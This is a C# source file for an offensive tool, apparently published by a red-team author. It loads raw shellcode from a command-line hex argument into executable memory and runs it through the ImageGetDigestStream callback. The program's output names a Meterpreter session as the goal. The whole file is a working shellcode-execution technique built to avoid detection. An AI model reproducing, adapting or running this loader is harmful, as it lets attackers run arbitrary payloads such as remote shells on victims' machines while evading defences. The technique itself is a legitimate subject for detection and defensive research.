using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NativePayload_ImageGetDigestStream
{
  
    class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000,
            Reserve = 0x00002000,
            Decommit = 0x00004000,
            Release = 0x00008000,
            Reset = 0x00080000,
            TopDown = 0x00100000,
            WriteWatch = 0x00200000,
            Physical = 0x00400000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            NoAccess = 0x0001,
            ReadOnly = 0x0002,
            ReadWrite = 0x0004,
            WriteCopy = 0x0008,
            Execute = 0x0010,
            ExecuteRead = 0x0020,
            ExecuteReadWrite = 0x0040,
            ExecuteWriteCopy = 0x0080,
            GuardModifierflag = 0x0100,
            NoCacheModifierflag = 0x0200,
            WriteCombineModifierflag = 0x0400
        }
        [DllImport("kernelbase.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("Imagehlp.dll")]
        private static extern bool ImageGetDigestStream(IntPtr filehandle, uint DigestLevel, IntPtr DigestFunction,IntPtr DigestHandle);
        static void Main(string[] args)
        {   
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_ImageGetDigestStream , Published by Damon Mohammadbagher , Mar 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_ImageGetDigestStream Callback Functions Technique via (ImageGetDigestStream) API");
            Console.WriteLine();
            string[] X = args[0].Split(',');

            byte[] Xpayload = new byte[X.Length];

            for (int i = 0; i < X.Length;){Xpayload[i] = Convert.ToByte(X[i], 16);i++;}
            Console.WriteLine();
            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
            Console.WriteLine("[!] VirtualAlloc.Result[" + p.ToString("X8") + "]");
            System.Threading.Thread.Sleep(5555);
            IntPtr p2 = CreateFileW(@"C:\Windows\System32\ntdll.dll", 0x01, 0x00000001, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            System.Threading.Thread.Sleep(5555);
            Console.WriteLine("[!] CreateFileW.Result[" + p2.ToString("X8") + "]");
            Console.WriteLine();
            Console.WriteLine("Bingo , Meterpreter Session via callback functions Technique by \"ImageGetDigestStream\"  ;)");
            IntPtr _out = IntPtr.Zero;
            bool ok = ImageGetDigestStream(p2, 0x04, p, _out);
            CloseHandle(_out);
            CloseHandle(p2);
            Console.ReadKey();
        }
    }
}
